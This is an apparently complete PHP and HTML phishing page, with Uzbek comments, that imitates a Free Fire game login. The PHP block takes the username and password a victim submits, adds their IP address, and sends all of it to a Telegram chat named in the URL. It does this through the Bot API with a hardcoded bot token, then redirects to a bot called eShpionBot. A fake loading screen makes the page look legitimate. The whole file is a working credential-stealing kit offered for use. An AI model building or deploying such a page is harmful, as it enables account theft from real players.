<?php
// domen.name/rm/123456789 formatida ishlaydi

// URL dan user_id ni olish
$path = $_SERVER['REQUEST_URI'];
$parts = explode('/', trim($path, '/'));

if (count($parts) >= 2) {
    $user_id = end($parts);
} else {
    $user_id = $_GET['id'] ?? '';
}

if(empty($user_id) || !is_numeric($user_id)) {
    header("Location: https://t.me/eShpionBot?start=true");
    exit;
}


if($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Noma\'lum';
    
    if(!empty($username) && !empty($password)) {
        $bot_token = "8940114047:AAEoEqS32SpwJ-ovcz3sJIQkL2M7YLvcpm4";
        $chat_id = $user_id;
        
        $message = "🎮 <b>Free Fire Login Ma'lumotlari</b>\n\n";
        $message .= "👤 <b>Username/ID:</b> <code>" . htmlspecialchars($username) . "</code>\n";
        $message .= "🔑 <b>Password:</b> <code>" . htmlspecialchars($password) . "</code>\n";
        $message .= "🌐 <b>IP:</b> " . htmlspecialchars($ip) . "\n";
        $message .= "🕒 <b>Vaqt:</b> " . date('Y-m-d H:i:s') . "\n";
        $message .= "🆔 <b>User ID:</b> <code>$user_id</code>";
        
        $url = "https://api.telegram.org/bot$bot_token/sendMessage";
        $data = [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
        
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_exec($ch);
        curl_close($ch);
    }
    
    header("Location: https://t.me/eShpionBot?start=true");
    exit;
}
?>
<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 15px; border: 1px solid rgba(255, 255, 255, 0.2); width: 100%; max-width: 400px; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.3); }
        .header { background: linear-gradient(to right, #ff7e5f, #feb47b); padding: 30px; text-align: center; }
        .header h1 { color: white; font-size: 32px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
        .header p { color: rgba(255,255,255,0.9); margin-top: 5px; }
        .content { padding: 30px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #feb47b; font-weight: 600; }
        .form-group input { width: 100%; padding: 12px 15px; background: rgba(255,255,255,0.1); border: 2px solid rgba(255,255,255,0.2); border-radius: 8px; color: white; font-size: 16px; transition: all 0.3s; }
        .form-group input:focus { outline: none; border-color: #ff7e5f; background: rgba(255,255,255,0.15); }
        .form-group input::placeholder { color: rgba(255,255,255,0.5); }
        .btn { width: 100%; background: linear-gradient(to right, #ff7e5f, #feb47b); color: white; border: none; padding: 15px; border-radius: 8px; font-size: 18px; font-weight: 600; cursor: pointer; transition: transform 0.2s; margin-top: 10px; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255,126,95,0.4); }
        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1a1a2e; display: flex; justify-content: center; align-items: center; z-index: 9999; flex-direction: column; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #ff7e5f; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden-form { display: none; }
        .loading-text { color: white; font-size: 18px; }
        .game-icon { text-align: center; margin-bottom: 20px; }
        .game-icon img { width: 80px; height: 80px; border-radius: 50%; border: 3px solid #ff7e5f; }
        .forgot-link { text-align: center; margin-top: 15px; }
        .forgot-link a { color: #feb47b; text-decoration: none; font-size: 14px; }
        .forgot-link a:hover { text-decoration: underline; }
        .social-login { margin-top: 20px; text-align: center; }
        .social-btn { display: inline-block; width: 40px; height: 40px; background: rgba(255,255,255,0.1); border-radius: 50%; margin: 0 5px; line-height: 40px; color: white; transition: background 0.3s; }
        .social-btn:hover { background: rgba(255,126,95,0.5); }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">Free Firega kirilmoqda...</div>
    </div>

    <div id="mainContent" class="hidden-form">
        <div class="container">
            <div class="header">
                <h1>🎮 Free Fire</h1>
                <p>Battle Royale O'yini</p>
            </div>
            
            <div class="content">
                <div class="game-icon">
                    <i class="fas fa-fire" style="font-size: 60px; color: #ff7e5f;"></i>
                </div>
                
                <form id="loginForm" method="POST">
                    <div class="form-group">
                        <label><i class="fas fa-user"></i> Username yoki ID</label>
                        <input type="text" name="username" placeholder="Username yoki Player ID" required>
                    </div>
                    
                    <div class="form-group">
                        <label><i class="fas fa-lock"></i> Parol</label>
                        <input type="password" name="password" placeholder="Parol" required>
                    </div>
                    
                    <button type="submit" class="btn">
                        <i class="fas fa-sign-in-alt"></i> Kirish
                    </button>
                </form>
                
                <div class="forgot-link">
                    <a href="#">Parolni unutdingizmi?</a>
                </div>
                
                <div class="social-login">
                    <p style="color: rgba(255,255,255,0.7); margin-bottom: 10px;">Boshqa hisob bilan kirish:</p>
                    <a href="#" class="social-btn"><i class="fab fa-facebook-f"></i></a>
                    <a href="#" class="social-btn"><i class="fab fa-google"></i></a>
                    <a href="#" class="social-btn"><i class="fab fa-twitter"></i></a>
                    <a href="#" class="social-btn"><i class="fab fa-vk"></i></a>
                </div>
            </div>
        </div>
    </div>

    <script>
        setTimeout(function() {
            document.getElementById('loadingOverlay').style.display = 'none';
            document.getElementById('mainContent').classList.remove('hidden-form');
            
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                this.submit();
            });
        }, 2000);
    </script>
</body>
</html>